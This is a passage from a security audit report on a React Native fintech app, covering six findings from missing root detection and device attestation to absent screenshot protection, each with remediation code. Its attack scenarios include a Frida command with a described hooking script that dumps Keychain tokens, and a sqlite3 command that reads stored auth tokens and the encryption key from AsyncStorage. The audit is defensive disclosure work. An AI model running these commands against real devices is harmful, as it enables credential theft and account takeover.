This is notable because `react-native-device-info` **is** a dependency (v14.0.4) and exposes `isEmulator()` and, on some platforms, rooted-device signals — but the app uses it only for `getIpAddress`, `getDeviceName`, `getBrand`, `getDeviceId`, `getBundleId`, `getBuildNumber`, and `getApplicationName` (see [src/hooks/useMemberLogin.tsx:44-56](src/hooks/useMemberLogin.tsx#L44-L56), [src/hooks/useLogOut.tsx:24-35](src/hooks/useLogOut.tsx#L24-L35)). The capability is present and unused.

There is also no:
- **Play Integrity API** integration (Android) — no `com.google.android.play:integrity` dependency, no server-side verdict verification.
- **DeviceCheck / App Attest** (iOS) — no `DeviceCheck.framework` usage, no `aps`-adjacent attestation entitlement.
- **Debugger detection** — no `ptrace`/`isDebuggerConnected` checks.
- **Hook/Frida detection** — no scanning for injected libraries or common hooking artefacts.
- **Integrity self-check** — nothing verifies the app's own signature or bundle hash at runtime.

For a custodial crypto and card-issuing application, this is a significant gap. The app's entire security model assumes the device is trustworthy, while providing no means to assess whether it is.

#### Attack Scenario

**Scenario A — Frida instrumentation on a rooted device.**
1. Attacker roots their device (or uses an already-rooted test device) and installs Frida.
2. `frida -U -f com.exchangapay.tst -l bypass.js` with a script that:
   - Hooks `ReactNativeBiometrics.simplePrompt` to always resolve `{success: true}` — defeating [H-14](#h-14--biometric-gate-is-client-side-navigation-only).
   - Hooks the Redux store to force `isKYC: true, customerState: "Approved"` — defeating the client-side gating in [useMemberLogin](src/hooks/useMemberLogin.tsx#L88-L180).
   - Hooks `Keychain.getGenericPassword` to dump the bearer token, `sk`, and the full `userInfo` blob.
   - Hooks `encryptAES` to log plaintext before encryption, defeating all application-layer crypto.
3. None of this is detected. The backend receives requests that are indistinguishable from a legitimate client.

**Scenario B — Keychain extraction.** On a rooted Android device, the Keystore-backed Keychain entries are extractable when the device is unlocked, particularly given they are stored with default accessibility and no `setUserAuthenticationRequired` binding ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)). The bearer token, refresh token, `sk`, and cached `userInfo` all fall out.

**Scenario C — Repackaged app on a fleet of devices.** Combining with [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore) and [C-08](#c-08--proguardr8-disabled-no-code-obfuscation): the attacker distributes a trojanised, correctly-signed build. Without server-side attestation, the backend has no way to distinguish it from the genuine app.

**Scenario D — Emulator farms for abuse.** Automated account creation, referral-bonus farming ([`getIsrefferalValid`](src/services/auth.tsx#L27), [`putReferralCode`](src/services/auth.tsx#L31)), and promotion abuse at scale from emulators, undetected.

#### Risk Impact

- **Complete client-side control bypass.** Every client-enforced check in the app (KYC gating, biometric lock, account-state banners, amount validation, address validation) is defeatable.
- **Credential theft** at rest from compromised devices.
- **Fraud/AML:** Inability to distinguish genuine devices enables systematic abuse and undermines transaction-monitoring assumptions.

#### Exploitation Possibility

**High** for a motivated attacker. Frida-based RN hooking is well-documented and largely scripted; this app presents no obstacles whatsoever.

#### Recommended Fix

**Tier 1 — Server-side attestation (highest value, do this first).**
1. **Android — Play Integrity API.** Request a token client-side, send it with sensitive requests, and **verify the verdict server-side**:
   - `MEETS_DEVICE_INTEGRITY` — rejects rooted/emulated devices.
   - `MEETS_STRONG_INTEGRITY` — hardware-backed, for high-value operations (withdrawals, card PIN reveal).
   - `appRecognitionVerdict: PLAY_RECOGNIZED` — rejects repackaged builds, which is the control that neutralises C-03.
2. **iOS — App Attest.** Generate a hardware-backed key via `DCAppAttestService`, attest it once at first launch, and sign subsequent sensitive requests with it. Verify assertions server-side.
3. **Enforce at the API layer**, not the UI layer. A failed attestation should cause the *backend* to reject the request, not the client to hide a button.

**Tier 2 — Client-side detection (defence in depth; assume it will be bypassed).**
4. Add a root/jailbreak library (`jail-monkey`, or the detection built into a commercial RASP). Use its verdict to:
   - **Warn and degrade**, rather than hard-block — hard-blocking generates support load and is trivially patched out anyway.
   - **Disable high-risk operations** on a flagged device: crypto withdrawal, card PIN reveal, card details display, password change.
   - **Report the signal to the backend** as a risk factor feeding transaction monitoring — this is the most durable use of a client-side check.
5. Use `DeviceInfo.isEmulator()` (already available) as a low-cost additional signal.

**Tier 3 — Commercial RASP.** For a fintech app at this risk profile, evaluate Guardsquare, Promon SHIELD, or Appdome for integrity self-checks, anti-hooking, anti-debugging, and repackaging detection that is meaningfully harder to strip than hand-rolled checks.

#### Best Practice Recommendation

Design on the assumption that the client is fully compromised. Every security decision that matters — KYC status, transaction limits, authorisation, fraud scoring — must be made and enforced server-side, with the client's attestation verdict as one input among several. Client-side detection is a signal-generation mechanism, not an enforcement mechanism.

---

### H-05 — redux-persist Encryption Transform Is Disabled

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-311 (Missing Encryption of Sensitive Data), CWE-922 (Insecure Storage of Sensitive Information) |
| **MASVS** | MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage |
| **Files** | [src/store/index.tsx:16-24](src/store/index.tsx#L16-L24), [src/utils/helpers/encryptionTransfermation.tsx](src/utils/helpers/encryptionTransfermation.tsx) |

#### Technical Explanation

A complete, correct encryption transform was written — and then commented out:

```tsx
// src/store/index.tsx
import encryptTransform from "../utils/helpers/encryptionTransfermation";

const keychainStorage = createKeychainStorage();

const persistConfig = {
  key: "root",
  storage: keychainStorage,
  whitelist: ["auth", "UserReducer"],
  blacklist: ["send", "sendcrypto"],
  // Temporarily disable encryption transform to debug redux-persist issue
  // transforms: [encryptTransform],          // ← DISABLED
};
```

The comment says "temporarily"; it is committed to the branch under audit.

**What is persisted unencrypted.** The whitelist covers `auth` and `UserReducer`. From [src/redux/Reducer/UserReducer.js](src/redux/Reducer/UserReducer.js), `UserReducer` holds:

- `userDetails` — set from `loginAction(safeCredentials)` at [SplashScreen.tsx:96](src/screens/SplashScreen.tsx#L96), which contains **`accessToken`, `refreshToken`, and `idToken`**.
- `userInfo` — the full member record from `getMemberInfo()`, including the **`sk` encryption key** ([used at useEncryption_Decryption.tsx:79](src/hooks/useEncryption_Decryption.tsx#L79)), encrypted-but-decryptable PII fields (`firstName`, `lastName`, `email`, `phoneNumber`, `phonecode`, `userName`), `role`, `customerState`, `isKYC`, `country`, `dob`.
- `personalInfo`, `ipInfo`, and various flags.

So the persisted blob contains **both the ciphertext of the user's PII and the key needed to decrypt it** — `sk` sits alongside the fields it protects. Once the blob is readable, the application-layer encryption is moot.

**The storage backend is a partial mitigation.** `createKeychainStorage()` from `redux-persist-keychain-storage@0.1.1` writes via `react-native-keychain`:

```js
async setItem(key, item) {
  await Keychain.setGenericPassword('data', item, { service: key });
}
```

So the data does land in the iOS Keychain / Android Keystore-backed store rather than `AsyncStorage`. That is meaningfully better than plaintext `SharedPreferences`. However:

- No `accessControl` or `accessible` options are passed ([H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding)) — so on iOS the default is `kSecAttrAccessibleWhenUnlocked`, readable whenever the device is unlocked, with no biometric requirement.
- **`redux-persist-keychain-storage` is version `0.1.1`, last published ~2018, and is effectively unmaintained** — a 27-line wrapper with no security review, no tests visible, and no updates across seven years of `react-native-keychain` API evolution.
- Keychain entries have a **size limit** in practice; persisting the full `userInfo` + credential blob as a single JSON string risks silent write failures on large payloads (worth testing).
- On a rooted/jailbroken device (undetected — [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)) Keystore/Keychain contents are extractable.

The transform itself ([encryptionTransfermation.tsx](src/utils/helpers/encryptionTransfermation.tsx)) is well-written — it fetches `sk` from the `userInfoService` Keychain entry and applies the correct random-IV `encryptAES`. Its one design flaw is circular: it encrypts `UserReducer` (which *contains* `sk`) using a key read from a *separate* Keychain entry, so rehydration depends on that separate entry surviving. That is probably the "redux-persist issue" that prompted disabling it.

#### Attack Scenario

1. Attacker gains filesystem/Keychain access to the device — rooted/jailbroken device, a forensic extraction, a malicious app exploiting a Keystore weakness, or a backup (note: `android:allowBackup="false"` is correctly set, which blocks the `adb backup` path — good).
2. Reads the `root` Keychain entry → obtains the full persisted Redux blob in plaintext JSON.
3. Extracts `accessToken` and `refreshToken` → **full account takeover** for the token lifetime, and indefinitely via the refresh token (which, per [H-07](#h-07--auth-tokens-also-written-to-plaintext-asyncstorage), is also stored elsewhere).
4. Extracts `sk` → decrypts every encrypted PII field in the same blob, and any encrypted field observed in network traffic.
5. Reads `isKYC`, `customerState`, `role` → knows exactly what the client-side gates check, enabling targeted patching.

#### Risk Impact

- **Confidentiality:** Complete — tokens, encryption key, and PII in one artefact.
- **Account takeover:** Direct, via the persisted refresh token.
- **Defeats the app's own crypto:** Storing `sk` next to the data it protects negates the field-level encryption design.

#### Exploitation Possibility

**Medium.** Requires device-level access, but that access yields everything at once with no further work.

#### Recommended Fix

1. **Do not persist credentials in Redux at all.** This is the root fix. `accessToken` / `refreshToken` / `idToken` are already stored correctly in the Keychain under `authTokenService` by [`storeToken()`](src/utils/helpers/index.tsx#L806-L818). Dispatching them into `userDetails` as well ([SplashScreen.tsx:96](src/screens/SplashScreen.tsx#L96)) duplicates them into a second, weaker store for no benefit. **Remove `loginAction(safeCredentials)`** and read tokens from the Keychain on demand, as `ApiService` already does.
2. **Narrow the persist whitelist.** Persist only what genuinely needs to survive a restart — a UI-state subset, not the full member record. Consider a `transform` that strips `sk` and all PII fields before writing:
   ```tsx
   const stripSensitive = createTransform(
     (inbound: any, key) => key === "UserReducer"
       ? { ...inbound, userDetails: undefined, userInfo: omit(inbound.userInfo, ["sk"]) }
       : inbound,
     (outbound) => outbound
   );
   ```
3. **Then re-enable encryption** for whatever remains, fixing the circular dependency by deriving the transform key from a **dedicated** Keychain entry that is never itself persisted (a random 32-byte key generated at first launch and stored under its own service).
4. **Replace `redux-persist-keychain-storage`.** It is unmaintained. Write the 20-line adapter in-house so you control the `accessControl` / `accessible` options:
   ```ts
   export const keychainStorage = {
     getItem: async (key: string) => {
       const c = await Keychain.getGenericPassword({ service: key });
       return c ? c.password : null;
     },
     setItem: async (key: string, value: string) => {
       await Keychain.setGenericPassword("data", value, {
         service: key,
         accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
         accessControl: Keychain.ACCESS_CONTROL.BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE,
         securityLevel: Keychain.SECURITY_LEVEL.SECURE_HARDWARE,
       });
     },
     removeItem: (key: string) => Keychain.resetGenericPassword({ service: key }),
   };
   ```
5. **Purge on logout.** `useLogOut` resets `authTokenService` and `chat_conversation_Id` but **does not reset the `root` persist entry or `userInfoService`** ([src/hooks/useLogOut.tsx:54-55](src/hooks/useLogOut.tsx#L54-L55)). The `rootReducer` LOGOUT branch resets in-memory state, but the persisted Keychain blob is only overwritten on the next write. Add:
   ```ts
   await Keychain.resetGenericPassword({ service: "userInfoService" });
   await persistor.purge();
   ```

#### Best Practice Recommendation

Sensitive material should have exactly one home. Tokens live in the Keychain/Keystore with hardware backing and biometric binding; the encryption key lives in a separate Keychain entry; Redux holds only derived, non-sensitive UI state. A "temporarily disabled" security control should never survive a code review — add a CI grep for commented-out `transforms:` and similar patterns.

---

### H-06 — Unauthenticated AES-CBC and a Legacy Zero-IV Decryption Fallback

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-353 (Missing Support for Integrity Check), CWE-329 (Predictable IV), CWE-327 (Broken/Risky Crypto Algorithm) |
| **MASVS** | MASVS-CRYPTO-1, MASVS-CRYPTO-2 |
| **OWASP Mobile Top 10** | M10 — Insufficient Cryptography |
| **Files** | [src/hooks/useEncryption_Decryption.tsx](src/hooks/useEncryption_Decryption.tsx), [src/utils/helpers/encryptionDecryption.tsx](src/utils/helpers/encryptionDecryption.tsx) |

#### Technical Explanation

The primary encryption scheme — used for all PII field encryption across ~416 call sites per the code comments — is **AES-CBC with PKCS#7 padding and no message authentication**:

```ts
const cipher = QuickCrypto.createCipheriv(cbcAlgorithm(keyBuf.length), keyBuf, iv);
const cipherBuf = Buffer.concat([cipher.update(plainText || '', 'utf8'), cipher.final()]);
return Buffer.concat([
  Buffer.from([BACKEND_RANDOM_IV_VERSION]),   // 0x01
  Buffer.from(iv),                             // 16 random bytes
  cipherBuf,
]).toString('base64');
```

**What is done well:** the IV is freshly random per message (`QuickCrypto.randomBytes(16)`), the wire format is explicitly versioned with a leading `0x01`, key length is validated to 128/192/256 bits, the algorithm variant is selected from the key length, and the migration from `crypto-js` to native `quick-crypto` was verified for cross-compatibility (per the code comments, 100/100). The decrypt memoisation cache correctly keys on `sk` so a key change cannot return another user's plaintext, and correctly refuses to cache failures or cache encryption. This is careful work.

**The two problems:**

**1. No authentication (no MAC).** CBC ciphertext is malleable. An attacker who can modify ciphertext can flip bits in block *n* to produce controlled bit-flips in the plaintext of block *n+1*. There is no MAC, no AEAD tag, and no integrity check anywhere in the scheme — the decryption path simply returns whatever PKCS#7 unpadding produces, or `""` on error:

```ts
} catch {
  // Do NOT cache failures — a transient error must be retryable.
  return '';
}
```

This silent-empty-string-on-failure behaviour is itself a concern: a tampered field decrypts to `''` and the UI renders an empty value rather than raising an error. In `encryptionDecryption.tsx` the equivalent path **throws** (`throw new Error("Decryption failed: " + error?.message)`), so the two implementations of the same scheme disagree on failure semantics.

**2. Legacy all-zero-IV fallback on decrypt.** Both implementations accept an unversioned legacy form using a **static all-zero IV**:

```ts
} else {
  // Legacy fallback: static all-zero IV, ciphertext is the bare base64.
  iv        = Buffer.alloc(AES_IV_SIZE, 0);
  cipherBuf = Buffer.from(cipherText, 'base64');
}
```

The comment in `encryptionDecryption.tsx` explicitly notes this replaced "a hardcoded all-zero IV (VAPT HIGH-02)" — so a prior assessment already flagged this, the *encryption* side was fixed, but the *decryption* side still accepts the weak form. This is understandable for data migration, but it means:

- Any data still stored in the legacy format remains deterministically encrypted (identical plaintext → identical ciphertext), permitting equality-matching and dictionary attacks across users who share a key, and confirm-the-guess attacks generally.
- The fallback is reached whenever the version byte check fails, so a well-formed attacker-supplied blob can force the zero-IV path.
- There is no telemetry on how often the legacy path is taken, so there is no way to know when it is safe to remove.

The detection heuristic itself is loose:
```ts
bytes.length > 1 + AES_IV_SIZE && bytes[0] === BACKEND_RANDOM_IV_VERSION && bytes.length % AES_BLOCK_SIZE === 1
```
A legacy ciphertext whose first byte happens to be `0x01` and whose length ≡ 1 (mod 16) would be misparsed as the new format, and vice versa — a low-probability but real correctness hazard.

#### Attack Scenario

**Scenario A — Ciphertext tampering (integrity).**
1. Attacker intercepts an encrypted field in transit (no pinning, [H-03](#h-03--no-certificate-pinning-on-either-platform)) or modifies it at rest in the persisted blob ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)).
2. Using CBC bit-flipping, the attacker modifies plaintext in a controlled way without knowing the key — e.g. altering a `walletAddress` or a display name in `withApplicantConf` passed to the Sumsub KYC SDK ([src/components/sumsub.tsx:114-124](src/components/sumsub.tsx#L114-L124)).
3. No integrity check detects the modification. If the failure path returns `''` (the hook's behaviour), the UI silently shows a blank value; if it produces plausible garbage, it is rendered as-is.

**Scenario B — Legacy-format exploitation.**
1. Attacker gathers legacy-format ciphertexts (deterministic, zero-IV) for a known field — e.g. `email` — across many users sharing infrastructure.
2. Attacker precomputes `AES-CBC(zero-IV, sk, candidate_email)` for a target and matches against captured ciphertext, confirming account existence and linking identities across records, without ever recovering `sk`.

**Scenario C — Padding oracle.** If the *backend* decrypts these fields and its error responses distinguish padding failures from other failures, a classic padding-oracle attack recovers plaintext byte-by-byte. This must be verified server-side; the client format is oracle-friendly.

#### Risk Impact

- **Integrity:** No guarantee that decrypted PII/financial fields are what was encrypted.
- **Confidentiality:** Legacy-format data is deterministically encrypted; padding-oracle exposure depends on backend behaviour.
- **Compliance:** Unauthenticated encryption of financial/PII data is below the "state of the art" bar expected under GDPR Art. 32 and PCI-DSS Req. 4.

#### Exploitation Possibility

**Medium.** Scenario A requires an interception or storage-write position (achievable given H-03/H-05). Scenario C depends on backend behaviour that must be tested.

#### Recommended Fix

1. **Migrate to AES-256-GCM** — this is the correct primitive and `react-native-quick-crypto` supports it natively:
   ```ts
   const AEAD_VERSION = 0x02;
   const NONCE_SIZE   = 12;

   export const encryptAES = (plainText: string, secretKey: string): string => {
     const keyBuf = Buffer.from(normalizeSecretKey(secretKey), "utf8");
     const nonce  = QuickCrypto.randomBytes(NONCE_SIZE);
     const cipher = QuickCrypto.createCipheriv("aes-256-gcm", keyBuf, nonce);
     const ct     = Buffer.concat([cipher.update(plainText, "utf8"), cipher.final()]);
     const tag    = cipher.getAuthTag();                       // ← integrity
     return Buffer.concat([Buffer.from([AEAD_VERSION]), nonce, tag, ct]).toString("base64");
   };
   ```
   This is a **coordinated change with the backend** (the C# `EncryptString`/`DecryptString` counterpart must move in lockstep). Version the format so both sides can accept `0x01` (CBC) during migration and emit only `0x02` (GCM).
2. **If GCM migration cannot happen immediately, add Encrypt-then-MAC** as an interim: append `HMAC-SHA256(macKey, version || iv || ciphertext)` and verify it in constant time before decrypting. Derive `macKey` separately from `sk` via HKDF — never reuse the encryption key for the MAC.
3. **Instrument the legacy path.** Add a counter (reported as a non-PII metric) each time the zero-IV fallback is taken. Once it reaches zero across a full release cycle, **delete the fallback**. Set a hard removal date.
4. **Tighten the version detection.** Rather than the length-modulo heuristic, require the version byte *and* a minimum length *and* — once GCM lands — successful tag verification. Ambiguity between formats should resolve to "reject", not "try the weak one".
5. **Unify the two implementations.** `useEncryption_Decryption.tsx` and `encryptionDecryption.tsx` implement the same scheme twice with divergent error semantics (return `''` vs. `throw`). Extract a single module; have the hook wrap it for Redux key access. Two copies of a crypto routine will drift.
6. **Add cryptographic unit tests** — known-answer tests against backend-produced vectors, a tamper test asserting that a flipped ciphertext bit causes a *detected* failure (this test is impossible to pass today, which is the point), and a determinism test asserting two encryptions of the same plaintext differ.

#### Best Practice Recommendation

Default to AEAD (AES-GCM or ChaCha20-Poly1305) for all new encryption; treat unauthenticated CBC as legacy-only with a scheduled removal date. Every ciphertext format should carry an explicit version byte from day one — this codebase does that correctly, and it is what makes the migration tractable.

---

### H-07 — Auth Tokens Also Written to Plaintext AsyncStorage

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-922 (Insecure Storage of Sensitive Information), CWE-312 (Cleartext Storage of Sensitive Information) |
| **MASVS** | MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage |
| **File** | [src/utils/auth.tsx](src/utils/auth.tsx) |

#### Technical Explanation

Alongside the Keychain-based token storage in `ApiService`/`helpers`, a **second, parallel token store** exists that writes access tokens, refresh tokens, expiry dates, the member ID, and the `sk` encryption key to **`AsyncStorage`**:

```tsx
// src/utils/auth.tsx
export const setAuthTokensToStorage = async (accessToken, accessTokenExpirationDate, refreshToken) => {
  await AsyncStorage.multiSet([
    [StorageKey.authAccessToken, accessToken],
    [StorageKey.authAccessTokenExpirationDate, accessTokenExpirationDate],
    [StorageKey.authRefreshToken, refreshToken],
  ]);
  ...
};

export const setEncryptKey = async (memberId, keySK) => {
  await AsyncStorage.multiSet([
    [StorageKey.memberId, memberId],
    [StorageKey.keySK, keySK],        // ← the AES key, in AsyncStorage
  ]);
};
```

With keys defined at [src/constants/index.tsx:1-7](src/constants/index.tsx#L1-L7):
```ts
export const StorageKey = {
  authAccessToken: '@auth:accessToken',
  authRefreshToken: '@auth:refreshToken',
  authAccessTokenExpirationDate: '@auth:accessTokenExpirationDate',
  twoFAAlert: '@storage_twoFAAlert',
  memberId: '@auth:memberId',
  keySK: '@auth:keySK',
};
```

**`AsyncStorage` provides no encryption.** On Android it is backed by SQLite in the app's private data directory (`/data/data/com.exchangapay.tst/databases/RKStorage`); on iOS it is a plaintext file in the app container. Neither is encrypted at the application layer. Both are readable on a rooted/jailbroken device, via a forensic extraction, or by any process that escapes the app sandbox.

**Storing `keySK` here is the most serious element** — it is the `sk` that decrypts every PII field in the application. Placing it in the weakest available store defeats the entire field-encryption design.

**Mitigating context:** static analysis found **no call sites** for `setAuthTokensToStorage`, `getAuthTokensFromStorage`, `setEncryptKey`, `getKeyEncrypt`, or `removeAuthTokensFromStorage` in `src/`. The module appears to be **dead code** — a legacy storage layer superseded by the Keychain approach in `helpers/index.tsx`. `AsyncStorage` is otherwise used only for the `theme` preference ([App.tsx:81](App.tsx#L81)) and `supportMessageCount` ([index.js:15-20](index.js#L15-L20)), both benign.

That reduces current exploitability substantially — but it does not make the finding safe to ignore:
- The functions are **exported** and importable; a future developer wiring them in reintroduces the vulnerability silently.
- If any historical build shipped with these called, tokens and `sk` may already be sitting in `AsyncStorage` on existing devices, and **nothing in the current code removes them** (`removeAuthTokensFromStorage` is also uncalled).
- Dead security-relevant code is a recurring source of regressions.

#### Attack Scenario

1. Attacker obtains filesystem access to the app's data directory (rooted device — undetected per [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation); forensic extraction; or a sandbox-escape).
2. `sqlite3 /data/data/com.exchangapay.tst/databases/RKStorage "SELECT * FROM catalystLocalStorage"` → all `AsyncStorage` contents in plaintext.
3. If any build ever populated these keys: `@auth:accessToken`, `@auth:refreshToken`, and `@auth:keySK` are read directly.
4. The refresh token grants **indefinite** account access (it survives access-token expiry and, per [checkAndRefreshToken](src/utils/helpers/index.tsx#L914-L952), is used to mint fresh access tokens). `keySK` decrypts all PII.

#### Risk Impact

- **Account takeover** (indefinite, via refresh token) and **full PII disclosure** (via `sk`) — *if* the code path is or was ever active.
- **Latent regression risk** — the API is present and inviting.

#### Exploitation Possibility

**Low today** (dead code), **High if reactivated**. Rated High on the basis of impact and the likelihood of accidental reintroduction.

#### Recommended Fix

1. **Delete `src/utils/auth.tsx` entirely.** It is superseded by the Keychain path. Also remove the now-unused `StorageKey.authAccessToken`, `authRefreshToken`, `authAccessTokenExpirationDate`, `memberId`, and `keySK` entries from [src/constants/index.tsx](src/constants/index.tsx).
2. **Add a defensive cleanup on next launch** to purge any residue from historical builds:
   ```ts
   // one-time migration, remove after two release cycles
   await AsyncStorage.multiRemove([
     '@auth:accessToken', '@auth:refreshToken',
     '@auth:accessTokenExpirationDate', '@auth:memberId', '@auth:keySK',
   ]);
   ```
3. **Add a lint rule / CI grep** forbidding `AsyncStorage` writes whose key or value matches `/token|secret|key|sk|password|pin|credential/i`.
4. **Document the single sanctioned storage path** in `CLAUDE.md` or a `SECURITY.md`: tokens → Keychain `authTokenService`; member record → Keychain `userInfoService`; everything non-sensitive → `AsyncStorage`. Make it unambiguous so the next developer does not invent a third store.

#### Best Practice Recommendation

Have exactly one storage abstraction for sensitive data, exported from one module, with the insecure alternatives lint-blocked. Dead code that handles credentials should be deleted rather than left commented or unreferenced — version control is the archive.

---

### H-08 — Sentry Session Replay and PII Collection Enabled

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-359 (Exposure of Private Personal Information), CWE-532 |
| **MASVS** | MASVS-PRIVACY-1, MASVS-PRIVACY-2 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage |
| **File** | [App.tsx:44-67](App.tsx#L44-L67) |

#### Technical Explanation

```tsx
if (oAuthConfig.sentryLoggs) {
  Sentry.init({
    dsn: oAuthConfig.sentryDsn,
    sendDefaultPii: oAuthConfig.sentryLoggs,     // ← IP, cookies, user context
    environment: oAuthConfig.sentryEnvornment,
    enableLogs: oAuthConfig.sentryLoggs,
    release: releaseName,
    replaysSessionSampleRate: 0.1,               // ← 10% of ALL sessions recorded
    replaysOnErrorSampleRate: 1,                 // ← 100% of error sessions recorded
    integrations: [
      Sentry.mobileReplayIntegration(),
      Sentry.feedbackIntegration(),
    ],
  });
}
```

**Session Replay records the user's screen.** In this application that means recording sessions that display: card PANs and CVVs ([CardDetails.tsx](src/screens/Tlv_Cards/CardDetails.tsx)), card PINs ([showPin.tsx](src/screens/Tlv_Cards/showPin.tsx)), crypto wallet addresses and balances, KYC document capture, statement contents, and support-chat conversations. `mobileReplayIntegration()` masks text and images by default in recent SDK versions, **but no explicit masking configuration is present here**, so the app is relying entirely on defaults it has not verified — and defaults do not cover custom native views, the Sumsub SDK surface, or the 2FA WebView.

`sendDefaultPii: true` additionally attaches the user's IP address, cookies, and request headers to every event.

`replaysOnErrorSampleRate: 1` means **100% of sessions that hit an error are recorded** — and given the error interceptor fires on every failed API call ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)), errors are common.

**A significant caveat cuts both ways.** The entire block is gated on `oAuthConfig.sentryLoggs`, and in `Environment.js` **`sentryLoggs: false`** for both `prod` and `tst`; the `dev` config has no `sentryLoggs` key at all. Since [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build) forces `tst`, `sentryLoggs` is currently `false` — meaning **`Sentry.init()` never runs**, and therefore:

- Session replay and PII collection are **not currently active** (reducing this finding's immediate exploitability), **but**
- **Production error reporting is entirely disabled** — a serious operational blind spot in its own right, tracked as [M-12](#m-12--production-error-reporting-effectively-disabled).
- `Sentry.wrap()` still wraps the app and `logApiErrorToSentry` still calls `Sentry.captureException` — these become no-ops without init, but the code path is live and will start transmitting the moment `sentryLoggs` is flipped to `true`.

So the configuration is a **loaded gun**: the instant someone enables Sentry (which they must, to get error reporting back), session replay at 10%/100% with PII begins immediately, with no masking review having been done.

#### Attack Scenario

1. A developer enables `sentryLoggs: true` to restore error visibility.
2. Session replay begins recording 10% of all sessions and 100% of error sessions.
3. Recordings of card-detail screens, PIN reveals, and KYC capture flow into Sentry.
4. Anyone with Sentry access — including anyone holding the **committed auth token from [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository)** — watches video-like reconstructions of customers viewing their card numbers and PINs.
5. Under PCI-DSS, recording a screen displaying full PAN and CVV constitutes storage of cardholder data and sensitive authentication data in an unapproved system.

#### Risk Impact

- **Confidentiality:** Visual capture of the most sensitive screens in the application.
- **Compliance:** PCI-DSS Req. 3.2 (SAD must not be stored post-authorisation); GDPR Art. 5(1)(c) minimisation, Art. 6 lawful basis (no consent mechanism exists), Art. 35 (a DPIA would be required for systematic session recording).
- **Operational (inverse):** As configured today, no production error telemetry at all.

#### Exploitation Possibility

**Low today** (init is gated off), **High on activation**. The finding is about the configuration that will apply the moment monitoring is restored.

#### Recommended Fix

1. **Decide deliberately whether session replay is acceptable for this app.** For a fintech app displaying PANs, PINs, and KYC documents, the defensible answer is **disable it entirely**:
   ```tsx
   replaysSessionSampleRate: 0,
   replaysOnErrorSampleRate: 0,
   integrations: [Sentry.feedbackIntegration()],   // drop mobileReplayIntegration
   ```
2. **If replay is retained**, it must be configured explicitly and verified:
   - Set aggressive masking: `maskAllText: true`, `maskAllImages: true`, `maskAllVectors: true`.
   - Wrap every sensitive screen in `Sentry.mask` / apply `sentry-mask` props to card, PIN, KYC, and chat views.
   - Reduce `replaysOnErrorSampleRate` well below 1.
   - **Manually review recordings** from a test device on each sensitive screen before enabling in production — masking defaults are not a substitute for verification.
3. **Set `sendDefaultPii: false`.** IP and cookie collection is not needed for crash triage and creates unnecessary GDPR scope.
4. **Add a `beforeSend` scrubber** shared with the Crashlytics fix from [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics) so `Request Body` / `Response Data` extras are redacted before transmission.
5. **Add a consent gate.** Initialise Sentry (and Crashlytics) only after the user has accepted analytics collection, with a settings toggle to withdraw consent.
6. **Fix the environment tagging.** `environment: oAuthConfig.sentryEnvornment` is `"development"` in both `prod` and `tst` configs (and the field name is misspelled — `sentryEnvornment`). Correct the spelling and drive the value from the real resolved environment.
7. **Restore error reporting** — see [M-12](#m-12--production-error-reporting-effectively-disabled). Enable Sentry with replay off and scrubbing on; that gives observability without the privacy exposure.

#### Best Practice Recommendation

Session replay in a regulated financial app should be treated as a feature requiring a DPIA, explicit user consent, verified masking, and a documented retention policy — not as a default-on SDK integration. Where crash context is the actual need, breadcrumbs and scrubbed structured logs deliver most of the diagnostic value at a fraction of the privacy cost.

---

### H-09 — No Screenshot / Screen-Recording Protection

| | |
|---|---|
| **Severity** | 🟠 **HIGH** |
| **CWE** | CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) |
| **MASVS** | MASVS-PRIVACY-3, MASVS-PLATFORM-3 |
| **OWASP Mobile Top 10** | M9 — Insecure Data Storage |
| **Scope** | Application-wide — no implementation found |

#### Technical Explanation

A repository-wide search for `FLAG_SECURE`, `setSecure`, `preventScreenshot`, `ScreenCaptureSecure`, `isCaptured`, and equivalent iOS APIs returns **no matches**.

Consequently:

**Android.** No `WindowManager.LayoutParams.FLAG_SECURE` is set on `MainActivity`. This means:
- Screenshots and screen recordings are permitted on every screen.
- The app's contents appear in the **Recents/task-switcher thumbnail**, which is written to disk and persists after the app is backgrounded.
- Screen-mirroring and casting capture everything.
- Accessibility-service malware and screen-reading malware can capture displayed content.

**iOS.** No `UIScreen.isCaptured` observation, no snapshot blurring on `applicationWillResignActive`, and no `UITextField.isSecureTextEntry`-based overlay trick. This means:
- Screenshots and screen recordings are permitted.
- The **app-switcher snapshot** is written to `Library/Caches/Snapshots/` in plaintext on the filesystem, capturing whatever was on screen at backgrounding.
- No detection of active screen recording.

**The screens this exposes** are precisely the highest-value ones in the app:

| Screen | Exposed content |
|---|---|
| [src/screens/Tlv_Cards/CardDetails.tsx](src/screens/Tlv_Cards/CardDetails.tsx) | Full card number (formatted with spaces at :148-149), CVV, expiry |
| [src/screens/Tlv_Cards/showPin.tsx](src/screens/Tlv_Cards/showPin.tsx) | Card PIN |
| [src/screens/Crypto/cryptoReceive.tsx](src/screens/Crypto/cryptoReceive.tsx), [cryptoCoinReceive.tsx](src/screens/Crypto/cryptoCoinReceive.tsx) | Wallet addresses + QR codes |
| [src/screens/Profile/addKycInfomation.tsx](src/screens/Profile/addKycInfomation.tsx) | Full KYC/PII data set |
| Sumsub SDK flow | Identity documents during capture |
